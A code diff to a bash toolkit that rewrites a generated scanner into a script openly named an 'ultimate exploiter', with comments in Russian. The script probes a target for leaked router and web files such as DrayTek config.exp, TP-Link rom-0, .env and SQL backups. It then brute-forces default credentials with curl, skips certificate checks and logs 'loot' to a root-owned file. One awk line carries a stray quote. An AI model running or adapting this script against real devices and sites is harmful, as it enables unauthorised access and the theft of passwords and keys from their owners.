@@ -939,20 +939,32 @@ run_pwd_gen() {
     read
 }
 
-generate_prime_heuristic_v3() {
+generate_prime_ultimate_exploiter_v4() {
     local target_file="$1"
     local code=$(cat << 'EOF'
 #!/bin/bash
-# PRIME_HEURISTIC_ULTIMATE_v3 (Terminal Beast)
+# PRIME_ULTIMATE_EXPLOITER_v4 (The RS-Killer Hybrid)
 
 TARGET="$1"
-UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
 
 echo "--------------------------------------------------"
-echo -e "\e[1;35m>> STARTING ULTIMATE HEURISTIC SCAN: $TARGET\e[0m"
+echo -e "\e[1;31m>> INITIATING FULL-CYCLE ATTACK VECTOR: $TARGET\e[0m"
 echo "--------------------------------------------------"
 
-# Массивы подгружаем прямо здесь
+# БАЗА ЗНАНИЙ: Пути и Ключевые слова для мгновенной эксплуатации (Bypass/Leaks)
+# Формат: "путь|ключевое_слово_успеха"
+VECTORS=(
+  "/cgi-bin/config.exp|sysPassword"       # DrayTek
+  "/rom-0|tplink"                         # TP-Link leak
+  "/.env|DB_PASSWORD"                     # Laravel/Web leak
+  "/config.php|password"                  # Direct source leak
+  "/phpmyadmin/setup/index.php|token"      # PMA Setup
+  "/get_set.cgi?get=wifi_settings|wireless_key" # IoT leak
+  "/backup.sql|INSERT INTO"               # DB Dump
+  "/wp-content/debug.log|WP_User"         # WP Sensitive info
+)
+
 # Тотальный список путей (Router, IoT, CMS, DB, Backups)
 PATHS=(
   "/" "/admin" "/login" "/panel"          # Базовые
@@ -968,6 +980,7 @@ PATHS=(
   "/backup.sql" "/dump.sql" "/db.bak"     # Забытые бэкапы БД
   "/cgi-bin/config.exp"                   # DrayTek & others
 )
+
 
 # Эвристический топ-20 (на базе статистики реальных взломов)
 CREDS=(
@@ -986,27 +999,42 @@ CREDS=(
 
 
 for path in "${PATHS[@]}"; do
-    # Пытаемся определить, живет ли там HTTP или HTTPS
     for proto in "http" "https"; do
         URL="${proto}://${TARGET}${path}"
         
-        # Предварительный замер: жива ли цель?
-        RESPONSE=$(curl -sL -I -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null)
-        CODE=$(echo "$RESPONSE" | grep "HTTP/" | awk '{print $2}' | tail -n1)
+        # 1. СТЕЛС-ЗОНДИРОВАНИЕ (как в твой v3)
+        RESPONSE=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null)
+        CODE=$(echo "$RESPONSE" | grep "HTTP/" | awk '{print $2}"' | tail -n1)
         SERVER=$(echo "$RESPONSE" | grep -i "Server:" | awk '{print $2}' | tr -d '\r')
 
-        if [[ "$CODE" == "200" || "$CODE" == "401" ]]; then
-            echo -e "\e[1;34m[*] TARGET DETECTED:\e[0m $path (Server: ${SERVER:-Unknown})"
-            
-            # Если 401 — значит точно нужна авторизация, бьем!
+        if [[ "$CODE" == "200" || "$CODE" == "401" || "$CODE" == "302" ]]; then
+            echo -e "\e[1;34m[*] DETECTED:\e[0m $URL (Server: ${SERVER:-Unknown})"
+
+            # 2. ПРОВЕРКА НА ПРЯМУЮ УТЕЧКУ (Exploit Logic)
+            for vec in "${VECTORS[@]}"; do
+                IFS='|' read -r v_path v_key <<< "$vec"
+                if [[ "$path" == "$v_path" ]]; then
+                    CONTENT=$(curl -sL -k -A "$UA" --max-time 3 "$URL")
+                    if [[ "$CONTENT" == *"$v_key"* ]]; then
+                        echo -e "    \e[1;31m[!!!] CRITICAL EXPLOIT SUCCESS: $v_key FOUND!\e[0m"
+                        echo "[EXPLOIT_LEAK] $URL | KEYWORD: $v_key" >> /root/prime_loot_full.txt
+                        # Не выходим, проверяем дальше пароли, если это возможно
+                    fi
+                fi
+            done
+
+            # 3. ЭВРИСТИЧЕСКИЙ БРУТ (Auth Logic из v3)
+            # Запускаем, если код 401 или если это страница логина (200)
+            echo -e "    \e[1;36m[>] Testing credentials...\e[0m"
             for pair in "${CREDS[@]}"; do
                 IFS=':' read -r u p <<< "$pair"
-                RES=$(curl -sL -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL")
+                # Используем -k для игнорирования ошибок SSL-сертификатов
+                RES=$(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL")
                 
                 if [[ "$RES" == "200" ]]; then
-                    echo -e "    \e[1;32m[!!!] VULNERABLE FOUND: $u:$p\e[0m @ $URL"
-                    echo "$u:$p@$TARGET$path" >> /root/prime_found_keys.txt
-                    break 2
+                    echo -e "    \e[1;32m[!!!] AUTH SUCCESS: $u:$p\e[0m"
+                    echo "[AUTH_MATCH] $u:$p @ $URL" >> /root/prime_loot_full.txt
+                    break
                 fi
             done
         fi
@@ -1018,6 +1046,8 @@ EOF
     smart_cat "$target_file" "$code"
     chmod +x "$target_file"
 }
+
+
 
 run_heuristic_router_scan() {
     clear
